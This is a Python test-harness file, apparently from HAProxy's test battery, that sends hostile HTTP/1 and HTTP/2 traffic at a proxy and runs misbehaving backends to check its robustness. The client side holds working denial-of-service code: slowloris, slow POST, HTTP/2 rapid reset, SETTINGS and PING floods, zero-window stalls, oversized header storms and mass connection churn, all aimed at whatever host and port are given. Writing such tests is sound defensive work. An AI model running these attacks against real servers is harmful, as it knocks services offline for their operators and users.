#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2000-2026 Willy Tarreau and HAProxy contributors. See LICENSE.
"""Hostile clients and misbehaving backends for the T247 battery.

    clients.py attack <scenario> <host> <port> <seconds> [workers]
    clients.py backend <hang|drip|reset> <port> <seconds>

Each attack runs for <seconds>, then closes everything and exits 0. No third-party
modules: HTTP/1 and HTTP/2 frames are built by hand (HPACK with static-table indexes and
literals only).
"""
import asyncio, os, random, socket, struct, sys, threading, time

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def frame(typ, flags, sid, payload=b""):
    return struct.pack(">I", len(payload))[1:] + bytes([typ, flags]) + struct.pack(">I", sid) + payload


def settings(items=()):
    return frame(4, 0, 0, b"".join(struct.pack(">HI", k, v) for k, v in items))


def hpack_int(v, prefix_bits, first):
    m = (1 << prefix_bits) - 1
    if v < m:
        return bytes([first | v])
    out = bytearray([first | m]); v -= m
    while v >= 128:
        out.append((v & 127) | 128); v >>= 7
    out.append(v)
    return bytes(out)


def hpack_lit(s):  # string literal, no Huffman
    return hpack_int(len(s), 7, 0) + s


def h2_request(sid, path=b"/?s=1k", extra=b"", end_stream=True):
    hb = b"\x82\x86" + b"\x04" + hpack_lit(path) + b"\x01" + hpack_lit(b"battery") + extra
    return frame(1, 0x4 | (0x1 if end_stream else 0), sid, hb)


def h2_big_header(n):  # literal, never-indexed, new name x-big
    return b"\x10" + hpack_lit(b"x-big") + hpack_lit(b"a" * n)


def rst(sid, code=8):
    return frame(3, 0, sid, struct.pack(">I", code))


def h1_get(path, extra=b"", close=False):
    return (b"GET " + path + b" HTTP/1.1\r\nHost: battery\r\n" + extra
            + (b"Connection: close\r\n" if close else b"") + b"\r\n")


class Deadline:
    def __init__(self, secs):
        self.end = time.monotonic() + secs

    def left(self):
        return self.end - time.monotonic()

    def over(self):
        return self.left() <= 0


async def connect(host, port, rcvbuf=None):
    s = socket.socket()
    s.setblocking(False)
    if rcvbuf:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
    loop = asyncio.get_running_loop()
    await loop.sock_connect(s, (host, port))
    return s


async def drain(s, dl, sleep=0.2):
    """Read and discard until EOF/error/deadline."""
    loop = asyncio.get_running_loop()
    try:
        while not dl.over():
            d = await asyncio.wait_for(loop.sock_recv(s, 65536), max(0.01, min(dl.left(), 5)))
            if not d:
                return
    except (asyncio.TimeoutError, OSError):
        pass


async def run_workers(n, dl, fn, *a):
    async def w(i):
        while not dl.over():
            try:
                await fn(i, dl, *a)
            except (OSError, asyncio.TimeoutError):
                await asyncio.sleep(0.05)
    await asyncio.gather(*[w(i) for i in range(n)])


# ---- scenarios -------------------------------------------------------------------------

async def slowloris(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, b"GET / HTTP/1.1\r\nHost: battery\r\n")
        while not dl.over():
            await asyncio.sleep(1.5)
            await loop.sock_sendall(s, b"X-a: b\r\n")  # never ends the header block
    finally:
        s.close()


async def slow_post(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, b"POST /?s=1k HTTP/1.1\r\nHost: battery\r\nContent-Length: 1000000\r\n\r\n")
        while not dl.over():
            await asyncio.sleep(1)
            await loop.sock_sendall(s, b"x")
    finally:
        s.close()


async def nonreader(i, dl, host, port, path=b"/?s=1g"):
    loop = asyncio.get_running_loop()
    s = await connect(host, port, rcvbuf=4096)
    try:
        await loop.sock_sendall(s, h1_get(path))
        while not dl.over():  # never read; hold. Reconnect only if the proxy closed us.
            await asyncio.sleep(1)
            try:
                if s.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT) == b"":
                    return
            except BlockingIOError:
                pass
    finally:
        s.close()


def h2_conn(host, port, init_settings=()):
    s = socket.create_connection((host, port))
    s.sendall(PREFACE + settings(init_settings))
    return s


def thread_pool(n, fn, dl, *a):
    ts = [threading.Thread(target=fn, args=(i, dl) + a, daemon=True) for i in range(n)]
    for t in ts: t.start()
    for t in ts: t.join()


def h2_rapid_reset_t(i, dl, host, port):
    while not dl.over():
        try:
            s = h2_conn(host, port)
            sid = 1
            while not dl.over() and sid < 2**30:
                buf = b"".join(h2_request(sid + 2 * k, b"/?s=1m", end_stream=True) + rst(sid + 2 * k)
                               for k in range(200))
                sid += 400
                s.sendall(buf)
                try:
                    while s.recv(65536, socket.MSG_DONTWAIT):
                        pass
                except BlockingIOError:
                    pass
            s.close()
        except OSError:
            time.sleep(0.05)


def h2_flood_t(i, dl, host, port):
    reads = i % 2 == 0
    batch = (settings() + frame(6, 0, 0, b"12345678")) * 500
    while not dl.over():
        try:
            s = h2_conn(host, port)
            while not dl.over():
                s.sendall(batch)
                if reads:
                    try:
                        while s.recv(65536, socket.MSG_DONTWAIT):
                            pass
                    except BlockingIOError:
                        pass
            s.close()
        except OSError:
            time.sleep(0.05)


async def h2_window0(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, PREFACE + settings([(4, 0)])
                                + b"".join(h2_request(1 + 2 * k, b"/?s=10m") for k in range(20)))
        await drain(s, dl)  # read (so the proxy's output flows) but never send WINDOW_UPDATE
    finally:
        s.close()


async def hdr_storm(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        for n in range(20):
            if dl.over():
                break
            kind = random.choice(("one8k", "many", "toobig"))
            if kind == "one8k":
                extra = b"X-Big: " + b"a" * 8000 + b"\r\n"
            elif kind == "many":
                extra = b"".join(b"X-%d: %s\r\n" % (k, b"b" * 80) for k in range(90))
            else:
                extra = b"X-Big: " + b"a" * 40000 + b"\r\n"
            await loop.sock_sendall(s, h1_get(b"/?s=1k", extra))
            got = b""
            while b"\r\n\r\n" not in got:
                d = await asyncio.wait_for(loop.sock_recv(s, 65536), 10)
                if not d:
                    return
                got += d
            if kind == "toobig":
                return  # the proxy should have answered 400 and closed
            await asyncio.sleep(0.01)
    finally:
        s.close()


async def hdr_storm_h2(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, PREFACE + settings())
        sid = 1
        while not dl.over() and sid < 100000:
            await loop.sock_sendall(s, h2_request(sid, b"/?s=1k", h2_big_header(8000)))
            sid += 2
            await drain(s, Deadline(0.05))
    finally:
        s.close()


async def churn_hold(i, dl, host, port):
    s = await connect(host, port)  # idle connection, held to push the process past maxconn
    try:
        await drain(s, dl)
    finally:
        s.close()


async def churn_fast(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        if i % 2:
            await loop.sock_sendall(s, h1_get(b"/?s=1k", close=True))
            await drain(s, Deadline(2))
    finally:
        s.close()


async def bad_backend_client(i, dl, host, port, path):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, h1_get(path, close=True))
        await drain(s, dl)
    finally:
        s.close()


def attack(name, host, port, secs, n):
    dl = Deadline(secs)
    aio = lambda fn, count, *a: asyncio.run(run_workers(count, dl, fn, host, port, *a))
    if name == "slowloris": aio(slowloris, n or 1800)
    elif name == "slow_post": aio(slow_post, n or 500)
    elif name == "nonreader": aio(nonreader, n or 300)
    elif name == "h2_rapid_reset": thread_pool(n or 4, h2_rapid_reset_t, dl, host, port)
    elif name == "h2_flood": thread_pool(n or 8, h2_flood_t, dl, host, port)
    elif name == "h2_window0": aio(h2_window0, n or 100)
    elif name == "hdr_storm": aio(hdr_storm, n or 16)
    elif name == "hdr_storm_h2": aio(hdr_storm_h2, n or 16)
    elif name == "churn":
        async def both():
            await asyncio.gather(run_workers(2500, dl, churn_hold, host, port),
                                 run_workers(50, dl, churn_fast, host, port))
        asyncio.run(both())
    elif name == "be_hang": aio(bad_backend_client, n or 400, b"/hang")
    elif name == "be_drip": aio(bad_backend_client, n or 400, b"/drip")
    elif name == "be_reset": aio(bad_backend_client, n or 50, b"/reset")
    else: sys.exit("unknown scenario " + name)


# ---- misbehaving backends --------------------------------------------------------------

def serve(kind, port, secs):
    dl = Deadline(secs)
    ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("127.0.0.1", port)); ls.listen(4096)

    def handle(c):
        try:
            c.settimeout(5)
            c.recv(65536)
            if kind == "hang":
                while not dl.over(): time.sleep(1)
            elif kind == "drip":
                c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 1000000\r\n\r\n")
                while not dl.over():
                    time.sleep(1); c.sendall(b"x")
            elif kind == "reset":
                c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 100000\r\n\r\n" + b"y" * 10000)
                time.sleep(0.05)
                c.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        except OSError:
            pass
        finally:
            c.close()
    ls.settimeout(1)
    while not dl.over():
        try:
            c, _ = ls.accept()
        except socket.timeout:
            continue
        threading.Thread(target=handle, args=(c,), daemon=True).start()


if __name__ == "__main__":
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
    if sys.argv[1] == "attack":
        attack(sys.argv[2], sys.argv[3], int(sys.argv[4]), float(sys.argv[5]),
               int(sys.argv[6]) if len(sys.argv) > 6 else 0)
    elif sys.argv[1] == "backend":
        serve(sys.argv[2], int(sys.argv[3]), float(sys.argv[4]))
